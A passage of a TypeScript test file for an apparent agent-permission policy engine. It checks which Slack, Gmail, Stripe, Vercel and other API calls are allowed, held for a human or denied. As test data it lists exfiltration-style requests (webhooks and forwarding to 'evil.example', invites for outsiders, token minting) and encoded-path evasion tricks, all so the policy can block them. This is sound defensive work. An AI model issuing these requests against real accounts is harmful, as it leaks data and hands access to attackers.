      ["PATCH", `${api}/repos/a/b/git/refs/heads/main`, "approve", { sha: "0", force: true }],
      ["DELETE", `${api}/repos/a/b`, "approve"],
      ["DELETE", `${api}/repos/a/b/issues/comments/1`, "approve"],
    ])
  })

  it.each(policies)("%s: matrix parameters, format suffixes and Unicode folds still meet the rules", (_id, policy) => {
    expectStories(policy, [
      ["POST", `${api}/repos/o/r/keys;x=1`, "deny"],
      ["POST", `${api}/repos/o/r/keys%3Bx=1`, "deny"],
      ["POST", `${api}/repos/o/r/keys.json`, "deny"],
      ["POST", `${api}/repos/o/r/hoo%E2%84%AAs`, "deny"],
      ["POST", `${api}/repos/o/r/transfer.json`, "deny"],
    ])
  })
})

describe("Slack", () => {
  const slack = policyOfTemplate("slack-bot")

  it("approves every way the bot posts, deletes or invites, whatever the HTTP method", () => {
    for (const method of [
      "chat.postMessage",
      "chat.postEphemeral",
      "chat.scheduleMessage",
      "chat.meMessage",
      "chat.update",
      "chat.delete",
      "conversations.invite",
    ]) {
      expect(decide(slack, "POST", `https://slack.com/api/${method}`).action, method).toBe("approve")
      expect(decide(slack, "GET", `https://slack.com/api/${method}?channel=C1&text=hi`).action, `GET ${method}`).toBe("approve")
    }
  })

  it("refuses every file upload step, whose bytes the vault never sees, and says to ask the human", () => {
    for (const method of [
      "files.getUploadURLExternal",
      "files.completeUploadExternal",
      "files.upload",
      "files.remote.add",
      "files.remote.info",
      "files.remote.list",
      "files.remote.remove",
      "files.remote.share",
      "files.remote.update",
    ]) {
      for (const [verb, url] of [
        ["POST", `https://slack.com/api/${method}`],
        ["GET", `https://slack.com/api/${method}?filename=x.txt&length=10`],
        ["POST", `https://slack.com/api/${method.toUpperCase()}`],
      ] as const) {
        const decision = decide(slack, verb, url)
        expect({ request: `${verb} ${url}`, action: decision.action }).toEqual({ request: `${verb} ${url}`, action: "deny" })
        expect(decision.notes).toEqual(["uploads bypass the approval card; ask the human to upload"])
      }
    }
    // Reading file metadata stays free.
    expect(decide(slack, "GET", "https://slack.com/api/files.info?file=F1").action).toBe("allow")
    expect(decide(slack, "GET", "https://slack.com/api/files.list").action).toBe("allow")
  })

  it("methods nobody listed need an approval, even by GET", () => {
    for (const method of ["conversations.inviteShared", "chat.unfurl", "conversations.setTopic", "conversations.setPurpose", "bookmarks.add", "canvases.create", "canvases.edit", "users.profile.set", "users.setPresence"]) {
      expect(decide(slack, "POST", `https://slack.com/api/${method}`).action, method).toBe("approve")
      expect(decide(slack, "GET", `https://slack.com/api/${method}?x=1`).action, `GET ${method}`).toBe("approve")
    }
  })
})

describe("Gmail", () => {
  const gmail = policyOfProvider("google-gmail")
  const base = "https://gmail.googleapis.com"

  it("denies sending a draft by id, and says to send the whole message instead", () => {
    for (const path of ["/gmail/v1/users/me/drafts/send", "/upload/gmail/v1/users/me/drafts/send"]) {
      const decision = decide(gmail, "POST", base + path, { id: "r-1" })
      expect(decision.action, path).toBe("deny")
      expect(decision.notes.join(" ")).toContain("messages/send")
    }
  })

  it("approves a send, including the PUT that carries a resumable upload's message", () => {
    expectStories(gmail, [
      ["PUT", `${base}/upload/gmail/v1/users/me/messages/send?uploadType=resumable&upload_id=u1`, "approve"],
      ["POST", `${base}/gmail/v1/users/me/messages/send`, "approve"],
      ["POST", `${base}/upload/gmail/v1/users/me/messages/send`, "approve"],
    ])
  })

  it("importing or inserting a message needs an approval", () => {
    expectStories(gmail, [
      ["POST", `${base}/gmail/v1/users/me/messages/import`, "approve", { raw: "x" }],
      ["POST", `${base}/gmail/v1/users/me/messages/insert`, "approve", { raw: "x" }],
      ["POST", `${base}/upload/gmail/v1/users/me/messages/import?uploadType=multipart`, "approve"],
      ["POST", `${base}/upload/gmail/v1/users/me/messages/insert?uploadType=media`, "approve"],
      ["PUT", `${base}/upload/gmail/v1/users/me/messages/insert?uploadType=resumable&upload_id=u1`, "approve"],
    ])
  })

  it("refuses forwarding, filters, delegates, send-as, POP and IMAP settings, and push notifications", () => {
    for (const path of ["forwardingAddresses", "autoForwarding", "filters", "filters/f1", "delegates", "sendAs", "sendAs/x@example.com", "pop", "imap", "vacation"]) {
      for (const method of WRITES) expect(decide(gmail, method, `${base}/gmail/v1/users/me/settings/${path}`).action, `${method} ${path}`).toBe("deny")
    }
    expectStories(gmail, [
      ["POST", `${base}/gmail/v1/users/me/watch`, "deny"],
      ["GET", `${base}/gmail/v1/users/me/settings/filters`, "allow"],
    ])
  })

  it("an escape that decodes into a double escape is refused before any rule", () => {
    expect(parseDestination("POST", `${base}/gmail/v1/users/me/messages/%25%37%33end`)).toEqual({ ok: false, error: "ambiguous-path" })
  })

  it("everything else, a draft update or a trash included, needs an approval", () => {
    expectStories(gmail, [
      ["PUT", `${base}/gmail/v1/users/me/drafts/r-1`, "approve"],
      ["POST", `${base}/gmail/v1/users/me/messages/m1/trash`, "approve"],
      ["DELETE", `${base}/gmail/v1/users/me/messages/m1`, "approve"],
      ["POST", `${base}/gmail/v1/users/me/labels`, "approve"],
    ])
  })
})

describe("the API-key templates keep money movement, admin and token minting behind a human", () => {
  it("Stripe", () => {
    expectStories(policyOfTemplate("stripe"), [
      ["POST", "https://api.stripe.com/v1/payouts", "approve"],
      ["POST", "https://api.stripe.com/v1/payouts/po_1/cancel", "approve"],
      ["POST", "https://api.stripe.com/v1/refunds", "approve"],
      ["POST", "https://api.stripe.com/v1/transfers", "approve"],
      ["POST", "https://api.stripe.com/v1/charges", "approve"],
      ["POST", "https://api.stripe.com/v1/payment_intents/pi_1/confirm", "approve"],
      ["POST", "https://api.stripe.com/v1/webhook_endpoints", "deny"],
      ["POST", "https://api.stripe.com/v1/customers/cus_1/sources", "approve"],
    ])
  })

  it("OpenAI and Anthropic", () => {
    expectStories(policyOfTemplate("openai"), [
      ["POST", "https://api.openai.com/v1/organization/admin_api_keys", "deny"],
      ["GET", "https://api.openai.com/v1/organization/users", "deny"],
      ["POST", "https://api.openai.com/v1/realtime/client_secrets", "approve"],
      ["DELETE", "https://api.openai.com/v1/files/file-1", "approve"],
    ])
    expectStories(policyOfTemplate("anthropic"), [
      ["POST", "https://api.anthropic.com/v1/organizations/api_keys", "deny"],
      ["DELETE", "https://api.anthropic.com/v1/files/f1", "approve"],
    ])
  })

  it("Cloudflare", () => {
    expectStories(policyOfTemplate("cloudflare-api-token"), [
      ["POST", "https://api.cloudflare.com/client/v4/user/tokens", "deny"],
      ["POST", "https://api.cloudflare.com/client/v4/accounts/a1/tokens", "deny"],
      ["POST", "https://api.cloudflare.com/client/v4/zones/z1/dns_records", "approve"],
      ["PUT", "https://api.cloudflare.com/client/v4/accounts/a1/workers/scripts/w1", "approve"],
      ["DELETE", "https://api.cloudflare.com/client/v4/zones/z1", "approve"],
    ])
  })

  it("Cloudflare: the reads no longer hand a tunnel's token to an agent, and minting tokens stays refused", () => {
    const template = getTemplate("cloudflare-api-token")
    if (!template) throw new Error("cloudflare-api-token")
    const resolve = (method: string, url: string) => {
      const parsed = parseDestination(method, url)
      if (!parsed.ok) throw new Error(url)
      return resolvePolicyRequest({ destination: parsed.destination, body: null, contentType: null, contentEncoding: null, policy: template.policy as Policy, binding: template.binding as Binding, policyMode: "standard", scope: null })
    }
    const tunnel = "https://api.cloudflare.com/client/v4/accounts/0123456789abcdef0123456789abcdef/cfd_tunnel/f70ff985-a4ef-4643-bbbc-4a0ed4fc8415"
    for (const method of ["GET", "HEAD"]) expect(resolve(method, `${tunnel}/token`)).toEqual({ action: "approve", reasons: ["cloudflare.tunnel-token", "generic.token"] })
    expect(resolve("GET", tunnel).action).toBe("allow")
    expect(resolve("GET", `${tunnel}/connections`).action).toBe("allow")
    expect(resolve("POST", "https://api.cloudflare.com/client/v4/accounts/0123456789abcdef0123456789abcdef/tokens").action).toBe("deny")
    expect(resolve("POST", "https://api.cloudflare.com/client/v4/user/tokens").action).toBe("deny")
  })

  it("Fly: reads go through, except app secrets, app secret keys and database passwords; writes need an approval; minting a token is refused", () => {
    expectStories(policyOfTemplate("fly"), [
      ["GET", "https://api.machines.dev/v1/apps/my-app", "allow"],
      ["GET", "https://api.machines.dev/v1/apps/my-app/machines", "allow"],
      ["GET", "https://api.machines.dev/v1/tokens/current", "allow"],
      ["GET", "https://api.machines.dev/v1/apps/my-app/secretkeys", "approve"],
      ["GET", "https://api.machines.dev/v1/apps/my-app/secretkeys/signing", "approve"],
      ["GET", "https://api.machines.dev/v1/apps/my-app/secretkeys/signing?min_version=1", "approve"],
      ["POST", "https://api.machines.dev/v1/apps/my-app/secretkeys/signing/decrypt", "approve"],
      ["DELETE", "https://api.machines.dev/v1/apps/my-app/secretkeys/signing", "approve"],
      ["GET", "https://api.machines.dev/v1/apps/my-app/secrets?show_secrets=true", "approve"],
      ["GET", "https://api.machines.dev/v1/apps/my-app/secrets/KEY?show_secrets=true", "approve"],
      ["GET", "https://api.machines.dev/v1/postgres/pg1/users/app/credentials", "approve"],
      ["POST", "https://api.machines.dev/v1/apps/my-app/secrets/KEY", "approve", { value: "x" }],
      ["POST", "https://api.machines.dev/v1/apps/my-app/machines", "approve"],
      ["POST", "https://api.machines.dev/v1/apps/my-app/deploy_token", "deny"],
      ["POST", "https://api.machines.dev/v1/tokens/kms", "deny"],
      ["POST", "https://api.machines.dev/v1/tokens/oidc", "deny"],
    ])
  })

  it("a push's own calls: each via's template allows or holds them, and refuses none", () => {
    expectStories(policyOfTemplate("github-pat"), [
      ["GET", "https://api.github.com/repos/o/r", "allow"],
      ["GET", "https://api.github.com/repos/o/r/environments/production", "allow"],
      ["GET", "https://api.github.com/repos/o/r/actions/secrets/KEY", "allow"],
      ["GET", "https://api.github.com/repos/o/r/environments/production/secrets/KEY", "allow"],
      ["GET", "https://api.github.com/repos/o/r/dependabot/secrets/KEY", "allow"],
      ["GET", "https://api.github.com/repos/o/r/actions/secrets/public-key", "allow"],
      ["PUT", "https://api.github.com/repos/o/r/actions/secrets/KEY", "approve", { encrypted_value: "x", key_id: "1" }],
      ["PUT", "https://api.github.com/repos/o/r/environments/production/secrets/KEY", "approve", { encrypted_value: "x", key_id: "1" }],
      ["PUT", "https://api.github.com/repos/o/r/dependabot/secrets/KEY", "approve", { encrypted_value: "x", key_id: "1" }],
    ])
    expectStories(policyOfTemplate("vercel"), [
      ["GET", "https://api.vercel.com/v9/projects/my-app?slug=acme", "allow"],
      ["POST", "https://api.vercel.com/v10/projects/my-app/env?upsert=true&slug=acme", "approve", { key: "KEY", value: "x", type: "sensitive", target: ["production"] }],
    ])
    expectStories(policyOfTemplate("cloudflare-api-token"), [
      ["GET", "https://api.cloudflare.com/client/v4/accounts/0123456789abcdef0123456789abcdef", "allow"],
      ["GET", "https://api.cloudflare.com/client/v4/accounts/0123456789abcdef0123456789abcdef/workers/scripts/w1/secrets", "allow"],
      ["PUT", "https://api.cloudflare.com/client/v4/accounts/0123456789abcdef0123456789abcdef/workers/scripts/w1/secrets", "approve", { name: "KEY", text: "x", type: "secret_text" }],
    ])
    expectStories(policyOfTemplate("fly"), [
      ["GET", "https://api.machines.dev/v1/apps/my-app", "allow"],
      ["POST", "https://api.machines.dev/v1/apps/my-app/secrets/KEY", "approve", { value: "x" }],
    ])
  })

  it("Linear: every mutation needs an approval", () => {
    expectStories(policyOfTemplate("linear"), [
      ["POST", "https://api.linear.app/graphql", "approve", { query: "mutation { issueCreate(input: {title: \"x\", teamId: \"t\"}) { success } }" }],
      ["POST", "https://api.linear.app/graphql", "approve", { query: "mutation { apiKeyCreate(input: {label: \"x\"}) { apiKey { id } } }" }],
      ["POST", "https://api.linear.app/graphql?query=mutation%7Bx%7D", "approve", { query: "{ viewer { id } }" }],
    ])
  })
})

describe("Google Calendar and Drive", () => {
  it("event writes, sharing and file writes need an approval; push notifications are refused", () => {
    expectStories(policyOfProvider("google-calendar"), [
      ["POST", "https://www.googleapis.com/calendar/v3/calendars/primary/events?sendUpdates=all", "approve", { attendees: [{ email: "x@evil.example" }] }],
      ["POST", "https://www.googleapis.com/calendar/v3/calendars/primary/acl", "approve"],
      ["POST", "https://www.googleapis.com/calendar/v3/calendars/primary/events/watch", "deny"],
    ])
    expectStories(policyOfProvider("google-drive"), [
      ["POST", "https://www.googleapis.com/drive/v3/files", "approve", { name: "x", parents: ["shared-by-someone"] }],
      ["POST", "https://www.googleapis.com/drive/v3/files/f1/copy", "approve"],
      ["POST", "https://www.googleapis.com/drive/v3/files/f1/permissions", "approve"],
      ["POST", "https://www.googleapis.com/drive/v3/changes/watch", "deny"],
    ])
  })
})

describe("the catalogue templates: tokens, access and copies elsewhere are refused", () => {
  it("minting or revoking a token, whatever the provider calls it", () => {
    const stories: [string, Story][] = [
      ["vercel", ["POST", "https://api.vercel.com/v3/user/tokens", "deny", { name: "x" }]],
      ["vercel", ["DELETE", "https://api.vercel.com/v3/user/tokens/t1", "deny"]],
      ["vercel", ["POST", "https://api.vercel.com/V3/USER/%74okens", "deny"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/api_keys", "deny", { key_name: "x" }]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/organizations/org-1/api_keys", "deny"]],
      ["openrouter", ["POST", "https://openrouter.ai/api/v1/keys", "deny", { name: "x" }]],
      ["openrouter", ["POST", "https://openrouter.ai/api/v1/auth/keys", "deny"]],
      ["resend", ["POST", "https://api.resend.com/api-keys", "deny", { name: "x" }]],
      ["npm", ["POST", "https://registry.npmjs.org/-/npm/v1/tokens", "deny", { password: "x" }]],
      ["npm", ["PUT", "https://registry.npmjs.org/-/user/org.couchdb.user:mallory", "deny"]],
      ["scaleway", ["POST", "https://api.scaleway.com/iam/v1alpha1/api-keys", "deny", { application_id: "a" }]],
      ["scaleway", ["POST", "https://api.scaleway.com/iam/v1alpha1/ssh-keys", "deny"]],
      ["snyk", ["POST", "https://api.snyk.io/rest/orgs/o1/service_accounts", "deny"]],
      ["snyk", ["POST", "https://api.eu.snyk.io/rest/orgs/o1/service_accounts/s1/secrets", "deny"]],
      ["elevenlabs", ["POST", "https://api.elevenlabs.io/v1/service-accounts/u1/api-keys", "deny"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/marketing/v3/transactional/smtp-tokens", "deny"]],
      ["sentry", ["POST", "https://de.sentry.io/api/0/api-tokens/", "deny"]],
      ["sentry", ["POST", "https://sentry.io/api/0/organizations/acme/org-auth-tokens/", "deny"]],
      ["posthog", ["POST", "https://eu.posthog.com/api/personal_api_keys/", "deny", { label: "x" }]],
      ["gitbook", ["POST", "https://api.gitbook.com/v1/integrations/i1/installations/n1/tokens", "deny"]],
      ["mistral", ["POST", "https://api.mistral.ai/v1/service-accounts", "deny"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("giving someone else access: members, invitations, roles and permissions", () => {
    const stories: [string, Story][] = [
      ["vercel", ["POST", "https://api.vercel.com/v2/teams/t1/members", "deny", { email: "x@evil.example" }]],
      ["vercel", ["POST", "https://api.vercel.com/v1/projects/p1/members", "deny"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/projects/p1/permissions", "deny", { email: "x@evil.example" }]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/organizations/org-1/invitations", "deny"]],
      ["posthog", ["POST", "https://us.posthog.com/api/organizations/o1/invites/", "deny", { target_email: "x@evil.example" }]],
      ["posthog", ["PATCH", "https://us.posthog.com/api/organizations/o1/members/u1/", "deny", { level: 15 }]],
      ["sentry", ["POST", "https://sentry.io/api/0/organizations/acme/members/", "deny", { email: "x@evil.example" }]],
      ["gitbook", ["POST", "https://api.gitbook.com/v1/orgs/o1/invites", "deny"]],
      ["gitbook", ["POST", "https://api.gitbook.com/v1/spaces/s1/permissions", "deny"]],
      ["elevenlabs", ["POST", "https://api.elevenlabs.io/v1/workspace/invites/add", "deny", { email: "x@evil.example" }]],
      ["snyk", ["POST", "https://api.snyk.io/rest/orgs/o1/invites", "deny"]],
      ["snyk", ["POST", "https://api.snyk.io/v1/org/o1/invite", "deny"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/settings/v3/users", "deny", { email: "x@evil.example" }]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/settings/users/2026-09", "deny"]],
      ["npm", ["PUT", "https://registry.npmjs.org/-/org/acme/user", "deny", { user: "mallory" }]],
      ["npm", ["PUT", "https://registry.npmjs.org/-/package/left-pad/collaborators", "deny"]],
      ["openrouter", ["POST", "https://openrouter.ai/api/v1/workspaces/w1/members/add", "deny"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("sending data elsewhere for good: webhooks, destinations, forwarding and drains", () => {
    const stories: [string, Story][] = [
      ["posthog", ["POST", "https://us.posthog.com/api/projects/1/hog_functions/", "deny", { inputs: { url: "https://evil.example" } }]],
      ["posthog", ["POST", "https://eu.posthog.com/api/environments/1/batch_exports/", "deny"]],
      ["sentry", ["POST", "https://sentry.io/api/0/organizations/acme/forwarding/", "deny"]],
      ["sentry", ["POST", "https://sentry.io/api/0/projects/acme/web/hooks/", "deny", { url: "https://evil.example" }]],
      ["vercel", ["POST", "https://api.vercel.com/v1/drains", "deny"]],
      ["vercel", ["POST", "https://api.vercel.com/v1/log-drains", "deny"]],
      ["vercel", ["POST", "https://api.vercel.com/v1/webhooks", "deny"]],
      ["fathom", ["POST", "https://api.fathom.ai/external/v1/webhooks", "deny", { destination_url: "https://evil.example", include_transcript: true }]],
      ["resend", ["POST", "https://api.resend.com/webhooks", "deny"]],
      ["postmark-server", ["POST", "https://api.postmarkapp.com/webhooks", "deny"]],
      ["postmark-server", ["PUT", "https://api.postmarkapp.com/server", "deny", { InboundHookUrl: "https://evil.example" }]],
      ["heygen", ["POST", "https://api.heygen.com/v3/webhooks/endpoints", "deny"]],
      ["openrouter", ["POST", "https://openrouter.ai/api/v1/observability/destinations", "deny"]],
      ["elevenlabs", ["POST", "https://api.elevenlabs.io/v1/workspace/webhooks", "deny"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/webhooks/v3/1/subscriptions", "deny"]],
      ["snyk", ["POST", "https://api.snyk.io/v1/org/o1/webhooks", "deny"]],
      ["npm", ["POST", "https://registry.npmjs.org/-/npm/v1/hooks/hook", "deny"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("deleting a project, a team or an organisation, transfers and billing", () => {
    const stories: [string, Story][] = [
      ["vercel", ["DELETE", "https://api.vercel.com/v9/projects/p1", "deny"]],
      ["vercel", ["DELETE", "https://api.vercel.com/v1/teams/t1", "deny"]],
      ["vercel", ["POST", "https://api.vercel.com/projects/p1/transfer-request", "deny"]],
      ["vercel", ["POST", "https://api.vercel.com/v1/billing/buy", "deny"]],
      ["neon", ["DELETE", "https://console.neon.tech/api/v2/projects/p1", "deny"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/projects/p1/transfer_requests", "deny"]],
      ["neon", ["PUT", "https://console.neon.tech/api/v2/organizations/org-1/billing/spending_limit", "deny"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/projects/p1/jwks", "deny", { jwks_url: "https://evil.example/jwks" }]],
      ["posthog", ["DELETE", "https://us.posthog.com/api/projects/1/", "deny"]],
      ["posthog", ["DELETE", "https://us.posthog.com/api/organizations/o1/", "deny"]],
      ["sentry", ["DELETE", "https://sentry.io/api/0/projects/acme/web/", "deny"]],
      ["sentry", ["DELETE", "https://sentry.io/api/0/organizations/acme/", "deny"]],
      ["gitbook", ["DELETE", "https://api.gitbook.com/v1/spaces/s1", "deny"]],
      ["scaleway", ["DELETE", "https://api.scaleway.com/account/v3/projects/p1", "deny"]],
      // Smaller deletes stay with a human, not refused.
      ["neon", ["DELETE", "https://console.neon.tech/api/v2/projects/p1/branches/b1", "approve"]],
      ["vercel", ["DELETE", "https://api.vercel.com/v13/deployments/d1", "approve"]],
      ["sentry", ["DELETE", "https://sentry.io/api/0/organizations/acme/issues/1/", "approve"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })
})

describe("the catalogue templates: money, sends and root access need a human", () => {
  it("spending money or creating something billed", () => {
    const stories: [string, Story][] = [
      ["hetzner-cloud", ["POST", "https://api.hetzner.cloud/v1/servers", "approve", { name: "x", server_type: "cx22", image: "ubuntu-24.04" }]],
      ["hetzner-cloud", ["POST", "https://api.hetzner.cloud/v1/servers/1/actions/change_type", "approve"]],
      ["scaleway", ["POST", "https://api.scaleway.com/instance/v1/zones/fr-par-1/servers", "approve"]],
      ["openrouter", ["POST", "https://openrouter.ai/api/v1/credits/coinbase", "approve", { amount: 1000 }]],
      ["openrouter", ["PUT", "https://openrouter.ai/api/v1/workspaces/w1/budgets/monthly", "approve"]],
      ["heygen", ["POST", "https://api.heygen.com/v3/videos", "approve", { type: "avatar" }]],
      ["firecrawl", ["POST", "https://api.firecrawl.dev/v2/crawl", "approve", { url: "https://example.com" }]],
      ["mistral", ["POST", "https://api.mistral.ai/v1/fine_tuning/jobs", "approve"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
    const hetzner = decide(policyOfTemplate("hetzner-cloud"), "POST", "https://api.hetzner.cloud/v1/servers")
    expect(hetzner.notes).toEqual(["creates or resizes something that is billed"])
  })

  it("sending email or a message, or publishing", () => {
    const stories: [string, Story][] = [
      ["resend", ["POST", "https://api.resend.com/emails", "approve", { from: "a@example.com", to: "x@evil.example", subject: "x" }]],
      ["resend", ["POST", "https://api.resend.com/emails/batch", "approve"]],
      ["resend", ["POST", "https://api.resend.com/broadcasts/b1/send", "approve"]],
      ["postmark-server", ["POST", "https://api.postmarkapp.com/email", "approve"]],
      ["postmark-server", ["POST", "https://api.postmarkapp.com/email/withTemplate", "approve"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/marketing/v3/transactional/single-email/send", "approve"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/marketing/v4/email/single-send", "approve"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/conversations/v3/conversations/threads/1/messages", "approve"]],
      ["hubspot-private-app", ["POST", "https://api.hubapi.com/automation/sequences/2026-09/enrollments", "approve"]],
      ["loops", ["POST", "https://app.loops.so/api/v1/transactional", "approve"]],
      ["loops", ["POST", "https://app.loops.so/api/v1/events/send", "approve"]],
      ["intercom", ["POST", "https://api.intercom.io/conversations/1/reply", "approve", { body: "x" }]],
      ["intercom", ["POST", "https://api.eu.intercom.io/messages", "approve"]],
      ["betterstack-uptime", ["POST", "https://uptime.betterstack.com/api/v2/incidents", "approve"]],
      ["betterstack-uptime", ["POST", "https://uptime.betterstack.com/api/v2/status-pages/1/status-reports", "approve"]],
      ["npm", ["PUT", "https://registry.npmjs.org/left-pad", "approve", { name: "left-pad" }]],
      ["notion", ["PATCH", "https://api.notion.com/v1/pages/p1", "approve"]],
      ["notion", ["PATCH", "https://api.notion.com/v1/blocks/b1/children", "approve"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("root access to a server, and copies of a real person", () => {
    const stories: [string, Story][] = [
      ["hetzner-cloud", ["POST", "https://api.hetzner.cloud/v1/servers/1/actions/reset_password", "approve"]],
      ["hetzner-cloud", ["POST", "https://api.hetzner.cloud/v1/servers/1/actions/enable_rescue", "approve"]],
      ["hetzner-cloud", ["POST", "https://api.hetzner.cloud/v1/servers/1/actions/request_console", "approve"]],
      ["heygen", ["POST", "https://api.heygen.com/v3/avatars", "approve", { type: "digital_twin" }]],
      ["heygen", ["POST", "https://api.heygen.com/v3/models/audio/voices", "approve"]],
      ["elevenlabs", ["POST", "https://api.elevenlabs.io/v1/voices/add", "approve"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })
})

describe("the catalogue templates: a read that returns another secret needs a human", () => {
  it("database passwords, decrypted variables and stored secrets", () => {
    const stories: [string, Story][] = [
      ["neon", ["GET", "https://console.neon.tech/api/v2/projects/p1/connection_uri?database_name=db&role_name=owner", "approve"]],
      ["neon", ["GET", "https://console.neon.tech/api/v2/projects/p1/branches/b1/roles/owner/reveal_password", "approve"]],
      ["neon", ["POST", "https://console.neon.tech/api/v2/projects/p1/branches/b1/roles/owner/reset_password", "approve"]],
      ["neon", ["GET", "https://console.neon.tech/api/v2/projects", "allow"]],
      ["neon", ["GET", "https://console.neon.tech/api/v2/projects/p1/branches/b1/roles", "allow"]],
      ["vercel", ["GET", "https://api.vercel.com/v10/projects/p1/env?decrypt=true", "approve"]],
      ["vercel", ["GET", "https://api.vercel.com/v1/projects/p1/env/e1", "approve"]],
      ["vercel", ["GET", "https://api.vercel.com/v1/env/e1", "approve"]],
      ["vercel", ["GET", "https://api.vercel.com/v9/projects", "allow"]],
      ["vercel", ["GET", "https://api.vercel.com/v6/deployments", "allow"]],
      ["scaleway", ["GET", "https://api.scaleway.com/secret-manager/v1beta1/regions/fr-par/secrets/s1/versions/latest/access", "approve"]],
      ["scaleway", ["GET", "https://api.scaleway.com/secret-manager/v1beta1/regions/fr-par/secrets-by-path/versions/latest/access?secret_name=x", "approve"]],
      ["scaleway", ["GET", "https://api.scaleway.com/instance/v1/zones/fr-par-1/servers", "allow"]],
      ["postmark-server", ["GET", "https://api.postmarkapp.com/server", "approve"]],
      ["postmark-server", ["GET", "https://api.postmarkapp.com/messages/outbound?count=10&offset=0", "allow"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("Better Stack: a heartbeat read returns its URL, a capability, so it needs a human; monitors and incidents do not", () => {
    const betterstack = policyOfTemplate("betterstack-uptime")
    const held = decide(betterstack, "GET", "https://uptime.betterstack.com/api/v2/heartbeats")
    expect(held.action).toBe("approve")
    expect(held.notes.join(" ")).toContain("healthy or failed")
    expectStories(betterstack, [
      ["GET", "https://uptime.betterstack.com/api/v2/heartbeats?page=2", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v2/heartbeats/1", "approve"],
      ["HEAD", "https://uptime.betterstack.com/api/v2/heartbeats/1", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v2/Heartbeats/1", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v2/heartbeats/1/availability", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v3/heartbeats", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v3/heartbeats/1", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v2/heartbeat-groups/1/heartbeats", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v3/heartbeat-groups/1/heartbeats", "approve"],
      ["GET", "https://uptime.betterstack.com/api/v2/heartbeat-groups", "allow"],
      ["GET", "https://uptime.betterstack.com/api/v2/heartbeat-groups/1", "allow"],
      ["GET", "https://uptime.betterstack.com/api/v2/monitors", "allow"],
      ["GET", "https://uptime.betterstack.com/api/v2/monitors/1", "allow"],
      ["GET", "https://uptime.betterstack.com/api/v3/incidents", "allow"],
      ["GET", "https://uptime.betterstack.com/api/v2/incidents/1", "allow"],
    ])
  })

  it("Fathom: a summary or transcript can be posted to a URL in the query, so it needs a human; the meetings list does not", () => {
    const fathom = policyOfTemplate("fathom")
    const held = decide(fathom, "GET", "https://api.fathom.ai/external/v1/recordings/1/transcript?destination_url=https%3A%2F%2Fevil.example")
    expect(held.action).toBe("approve")
    expect(held.notes.join(" ")).toContain("meetings list")
    expectStories(fathom, [
      ["GET", "https://api.fathom.ai/external/v1/recordings/1/summary", "approve"],
      ["GET", "https://api.fathom.ai/external/v1/meetings?include_transcript=true", "allow"],
      ["GET", "https://api.fathom.ai/external/v1/teams", "allow"],
    ])
  })
})

describe("the catalogue templates: the everyday calls stay free of approvals", () => {
  it("model calls", () => {
    const stories: [string, Story][] = [
      ["google-gemini", ["POST", "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent", "allow", { contents: [] }]],
      ["google-gemini", ["POST", "https://generativelanguage.googleapis.com/v1beta/models/text-embedding-004:embedContent", "allow"]],
      ["google-gemini", ["POST", "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions", "allow"]],
      ["google-gemini", ["POST", "https://generativelanguage.googleapis.com/v1beta/tunedModels/t1/permissions", "deny"]],
      ["mistral", ["POST", "https://api.mistral.ai/v1/chat/completions", "allow", { model: "mistral-large-latest", messages: [] }]],
      ["mistral", ["POST", "https://api.mistral.ai/v1/ocr", "allow"]],
      ["groq", ["POST", "https://api.groq.com/openai/v1/chat/completions", "allow"]],
      ["groq", ["POST", "https://api.groq.com/openai/v1/audio/transcriptions", "allow"]],
      ["openrouter", ["POST", "https://openrouter.ai/api/v1/chat/completions", "allow"]],
      ["openrouter", ["GET", "https://openrouter.ai/api/v1/models", "allow"]],
      ["together", ["POST", "https://api.together.xyz/v1/chat/completions", "allow"]],
      ["ollama-cloud", ["POST", "https://ollama.com/api/chat", "allow", { model: "gpt-oss:120b", messages: [] }]],
      ["ollama-cloud", ["POST", "https://ollama.com/v1/chat/completions", "allow"]],
      ["ollama-cloud", ["POST", "https://ollama.com/api/web_search", "allow", { query: "x" }]],
      ["ollama-cloud", ["POST", "https://ollama.com/api/web_fetch", "approve", { url: "https://example.com" }]],
      ["ollama-cloud", ["POST", "https://ollama.com/api/push", "approve"]],
      ["elevenlabs", ["POST", "https://api.elevenlabs.io/v1/text-to-speech/voice1", "allow", { text: "hi" }]],
      ["elevenlabs", ["POST", "https://api.elevenlabs.io/v1/speech-to-text", "allow"]],
      ["heygen", ["POST", "https://api.heygen.com/v3/models/audio/tts", "allow"]],
    ]
    for (const [id, story] of stories) expectStories(policyOfTemplate(id), [story])
  })

  it("searches, scrapes, queries and reads", () => {
    const stories: [string, Story][] = [
      ["brave-search", ["GET", "https://api.search.brave.com/res/v1/web/search?q=vault", "allow"]],
      ["brave-search", ["POST", "https://api.search.brave.com/res/v1/web/search", "approve"]],
